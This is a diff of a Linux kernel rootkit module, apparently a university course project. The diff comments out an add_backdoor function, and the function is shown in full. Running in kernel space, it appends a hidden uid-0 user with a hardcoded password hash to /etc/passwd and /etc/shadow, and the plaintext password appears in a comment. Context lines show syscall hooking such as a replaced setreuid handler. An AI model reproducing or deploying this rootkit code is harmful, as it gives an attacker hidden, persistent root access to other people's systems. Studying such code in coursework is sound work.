@@ -56,136 +56,136 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 // End Brendan
 
 // Start Marc - Inserting/removing backdoor & hide backdoor entrance
-void add_backdoor(char *path) {
+// void add_backdoor(char *path) {
 	
-		char* backdoor_password = "rootkituser1:x:12345:0:backdoor:/home:/bin/bash\n";
-		char* backdoor_shadow = "rootkituser:$6$zTDiFKXM$SuJZFgTirs8r9O9PTskLTnvNV1tvMLiS6h87/c3xrRJEahO5q7bJTT5fgNZWPFrYskf6aNjwKto2dixpTr1Zw0:18232:0:99999:7:::\n";
-		// PASSWORD (encodes in SHA 512) = cse331!	
+// 		char* backdoor_password = "rootkituser1:x:12345:0:backdoor:/home:/bin/bash\n";
+// 		char* backdoor_shadow = "rootkituser:$6$zTDiFKXM$SuJZFgTirs8r9O9PTskLTnvNV1tvMLiS6h87/c3xrRJEahO5q7bJTT5fgNZWPFrYskf6aNjwKto2dixpTr1Zw0:18232:0:99999:7:::\n";
+// 		// PASSWORD (encodes in SHA 512) = cse331!	
 		
-		struct file *file;
-		char *backdoor;
-		mm_segment_t old_fs;
+// 		struct file *file;
+// 		char *backdoor;
+// 		mm_segment_t old_fs;
 		
-		char *buffer;
-		int page_count = 0;
+// 		char *buffer;
+// 		int page_count = 0;
 	
-		bool backdoor_existing = false; // If backdoor with same name already exists
+// 		bool backdoor_existing = false; // If backdoor with same name already exists
 		
 		
-		loff_t offset; // Offset used for determining location of new user in list
+// 		loff_t offset; // Offset used for determining location of new user in list
 		
-		unsigned long ret;
+// 		unsigned long ret;
 		
-		if (strcmp(path, "/etc/passwd") == 0) // If adding into passwd file
-			{backdoor = backdoor_password;}
-		if (strcmp(path, "/etc/shadow") == 0) // If adding into shadow file
-			{backdoor = backdoor_shadow;}
+// 		if (strcmp(path, "/etc/passwd") == 0) // If adding into passwd file
+// 			{backdoor = backdoor_password;}
+// 		if (strcmp(path, "/etc/shadow") == 0) // If adding into shadow file
+// 			{backdoor = backdoor_shadow;}
 		
-		old_fs = get_fs(); 
+// 		old_fs = get_fs(); 
 		
-		set_fs(get_ds()); 
-	    	file = filp_open(path, O_RDWR, 0); 
-	    	set_fs(old_fs); 
+// 		set_fs(get_ds()); 
+// 	    	file = filp_open(path, O_RDWR, 0); 
+// 	    	set_fs(old_fs); 
 
-	    	if(IS_ERR(file)){
-			goto exit;
-// 			return 0;
-	    	}
+// 	    	if(IS_ERR(file)){
+// 			goto exit;
+// // 			return 0;
+// 	    	}
 
-	    	//check if backdoor already exists
-	    	buffer = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
+// 	    	//check if backdoor already exists
+// 	    	buffer = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
 
-	    	if(!buffer){
-			goto cleanup1;
+// 	    	if(!buffer){
+// 			goto cleanup1;
 			
-// 			 if(file)
-// 			 	{filp_close(file, NULL);}
-// 			return 0;
-	    	}
+// // 			 if(file)
+// // 			 	{filp_close(file, NULL);}
+// // 			return 0;
+// 	    	}
 
-	    	backdoor_existing = false;
-	    	ret = PAGE_SIZE;
-	    	offset = 0;
-	    	while(ret == PAGE_SIZE){
-			offset = page_count*PAGE_SIZE;
+// 	    	backdoor_existing = false;
+// 	    	ret = PAGE_SIZE;
+// 	    	offset = 0;
+// 	    	while(ret == PAGE_SIZE){
+// 			offset = page_count*PAGE_SIZE;
 
-			set_fs(get_ds());
-			ret = vfs_read(file, buffer, PAGE_SIZE, &offset);
-			set_fs(old_fs);
+// 			set_fs(get_ds());
+// 			ret = vfs_read(file, buffer, PAGE_SIZE, &offset);
+// 			set_fs(old_fs);
 
-			if(ret < 0){
+// 			if(ret < 0){
 				
-				goto cleanup2;
-// 		    		if(buffer)
-// 					{kfree(buffer);}
-// 		    	if(file)
-// 		    		{filp_close(file, NULL);}
-// 			return offset;
-			}
+// 				goto cleanup2;
+// // 		    		if(buffer)
+// // 					{kfree(buffer);}
+// // 		    	if(file)
+// // 		    		{filp_close(file, NULL);}
+// // 			return offset;
+// 			}
 
-			page_count++;
+// 			page_count++;
 
-			if(strstr(buffer, backdoor)){
-			    backdoor_existing = true;
-			    break;
-			}
-	    	}
+// 			if(strstr(buffer, backdoor)){
+// 			    backdoor_existing = true;
+// 			    break;
+// 			}
+// 	    	}
 
-	    	if(backdoor_existing){
-			goto cleanup2;
-// 			if(buffer)
-// 				{kfree(buffer);}
-// 		    if(file)
-// 		    	{filp_close(file, NULL);}
-// 		return offset;
+// 	    	if(backdoor_existing){
+// 			goto cleanup2;
+// // 			if(buffer)
+// // 				{kfree(buffer);}
+// // 		    if(file)
+// // 		    	{filp_close(file, NULL);}
+// // 		return offset;
 			
-		    }
+// 		    }
 
-	    	//seek offset to end of file
-	    	offset = 0;
+// 	    	//seek offset to end of file
+// 	    	offset = 0;
 
-	    	set_fs(get_ds());
-	    	offset = vfs_llseek(file, offset, SEEK_END);
-	    	set_fs(old_fs);
+// 	    	set_fs(get_ds());
+// 	    	offset = vfs_llseek(file, offset, SEEK_END);
+// 	    	set_fs(old_fs);
 
-	    	if(offset < 0){
-			goto cleanup2;
+// 	    	if(offset < 0){
+// 			goto cleanup2;
 			
-// 			if(buffer)
-// 				{kfree(buffer);}
-// 		    if(file)
-// 		    	{filp_close(file, NULL);}
-// 		return;
+// // 			if(buffer)
+// // 				{kfree(buffer);}
+// // 		    if(file)
+// // 		    	{filp_close(file, NULL);}
+// // 		return;
 			
-		}
+// 		}
 
-		//insert backdoor to the end of file
-		ret = 0;
-	    	set_fs(get_ds()); 
-		ret = vfs_write(file, backdoor, strlen(backdoor),&offset); 
-		set_fs(old_fs); 
+// 		//insert backdoor to the end of file
+// 		ret = 0;
+// 	    	set_fs(get_ds()); 
+// 		ret = vfs_write(file, backdoor, strlen(backdoor),&offset); 
+// 		set_fs(old_fs); 
 	
-		if(ret<0){
+// 		if(ret<0){
 			
-			goto cleanup2;
-// 			if(buffer)
-// 				{kfree(buffer);}
-// 		    if(file)
-// 		    	{filp_close(file, NULL);}
-// 		return offset;
-	    	}
+// 			goto cleanup2;
+// // 			if(buffer)
+// // 				{kfree(buffer);}
+// // 		    if(file)
+// // 		    	{filp_close(file, NULL);}
+// // 		return offset;
+// 	    	}
 
-		cleanup2:
-		    if(buffer)
-			kfree(buffer);
+// 		cleanup2:
+// 		    if(buffer)
+// 			kfree(buffer);
 	
-		cleanup1:
-		    if(file)
-			filp_close(file, NULL);
+// 		cleanup1:
+// 		    if(file)
+// 			filp_close(file, NULL);
 	
-		exit:
-		    return;
-}
+// 		exit:
+// 		    return;
+// }
 
 // void hide_backdoor (void) {
 	
@@ -318,13 +318,15 @@ static int __init rootkit_init(void){
 	
 // 	int offset;
 	
-	add_backdoor(password_file);
+// 	add_backdoor(password_file);
+	
 // 	offset = add_backdoor(password_file);
 	
 // 	original_getdents = (void *)sys_call_address[offset];                        \
 //     	sys_call_address[offset] = (unsigned long*)&original_getdents;
 	
-	add_backdoor(shadow_file);
+// 	add_backdoor(shadow_file);
+	
 //    	offset = add_backdoor(shadow_file);
 	
 // 	original_getdents = (void *)sys_call_address[offset];                        \
